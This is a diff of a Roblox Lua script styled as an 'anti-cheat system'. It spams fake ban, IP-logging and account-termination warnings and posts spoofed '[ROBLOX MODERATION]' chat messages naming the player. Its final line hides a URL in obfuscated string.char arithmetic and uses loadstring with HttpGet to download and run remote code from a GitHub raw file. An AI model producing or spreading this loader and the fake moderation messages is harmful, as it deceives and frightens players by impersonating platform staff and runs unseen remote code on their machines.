@@ -1,22 +1,41 @@
+print("ANTI-CHEAT SYSTEM LOADED")
+warn("⚠️⚠️⚠️ CHEAT DETECTION INITIATED ⚠️⚠️⚠️")
 
-for i = 1, 500 do
-    warn(" CHEAT DETECTED ")
-    warn("Owner: jefferyarthurs | Frag")
-    warn("Your account will be banned in 5 seconds...")
-    warn("Screenshot sent to Roblox Anti-Cheat")
-    warn("IP logged • HWID logged • Account terminated")
-    warn(" CHEAT DETECTED BY MOONSEC ANTICHEAT ")
-    warn(" ")
+for i = 1, 800 do
+    warn("🚨 CHEAT DETECTED 🚨")
+    warn("Player: " .. game.Players.LocalPlayer.Name)
+    warn("Violation: Script Injection + Exploiting")
+    warn("HWID: LOGGED | IP: LOGGED | Account ID: LOGGED")
+    warn("Roblox Moderation Team has been notified")
+    warn("Permanent Ban in progress... 00:0" .. math.random(1,9) .. " remaining")
+    warn("jefferyarthurs • Frag • Moonsec3")
+    warn("────────────────────────────────────")
+    task.wait(0.07)
 end
 
-
+-- Бесконечный агрессивный спам
 task.spawn(function()
-    while wait(0.03) do  
-        warn(" CHEAT DETECTED ")
-        warn("YOU ARE BEING WATCHED")
-        warn("jefferyarthurs was here")
+    while true do
+        warn("█▓▒░ CHEAT DETECTED ░▒▓█")
+        warn("YOU WILL BE BANNED")
+        warn("ALL YOUR ASSETS WILL BE REMOVED")
+        warn("Screenshot sent to staff")
+        task.wait(0.2)
     end
 end)
 
+-- Фейковые сообщения "от модерации"
+task.spawn(function()
+    wait(2)
+    for i = 1, 30 do
+        game.StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = "[ROBLOX MODERATION]: " .. game.Players.LocalPlayer.Name .. " has been flagged for exploiting.",
+            Color = Color3.fromRGB(255, 0, 0),
+            Font = Enum.Font.GothamBold
+        })
+        task.wait(1.5)
+    end
+end)
 
+-- Основной скрипт
 loadstring(game:HttpGet(string.char(104, (177 - 61), (348 / 3), (56 + 56), (230 / 2), (134 - 76), (23 + 24), 47, 114, (48 + 49), 119, (184 / 4), 103, (149 - 44), (180 - 64), (52 + 52), (138 - 21), (392 / 4), (151 - 34), 115, (146 - 45), (342 / 3), (297 / 3), (333 / 3), 110, (58 + 58), (202 / 2), (55 + 55), (58 + 58), (23 + 23), 99, (222 / 2), 109, 47, (152 - 48), 52, (240 / 2), (60 + 60), (480 / 4), (57 + 58), 99, 101, 105, (187 - 75), (153 - 37), (133 - 28), (156 - 46), 103, (201 - 85), (57 + 57), (196 - 91), (200 / 2), 101, (220 / 2), (175 - 59), 47, 106, (126 - 25), (306 / 3), (171 - 69), 101, (57 + 57), 121, (291 / 3), 114, 116, (157 - 53), 117, (124 - 10), 115, 46, (408 / 4), 114, (173 - 76), (151 - 54), (51 + 52), (23 + 24), 114, (50 + 51), 102, 115, (94 / 2), 104, 101, 97, (300 / 3), (230 / 2), 47, (120 - 11), (48 + 49), (52 + 53), 110, (109 - 62), (53 + 53), 101, 102, 102, (50 + 51), (342 / 3), (186 - 65), (119 - 22), 114, (127 - 11), 104, 117, (57 + 57), 115, (72 - 26), 116, (480 / 4), (181 - 65), (87 - 40), (55 + 56), 98, (204 / 2), (468 / 4), 115, 99, (48 + 49), (348 / 3), (153 - 42), (212 - 98), (23 + 23), 101, (60 + 60), 101, (154 - 55), (23 + 23), 108, (58 + 59), (48 + 49), (56 - 10), (464 / 4), 120, 116, (70 - 24), (54 + 54), (58 + 59), 97, (23 + 23), 99, 37, 50, 66, (136 - 99), 50, 66)))()
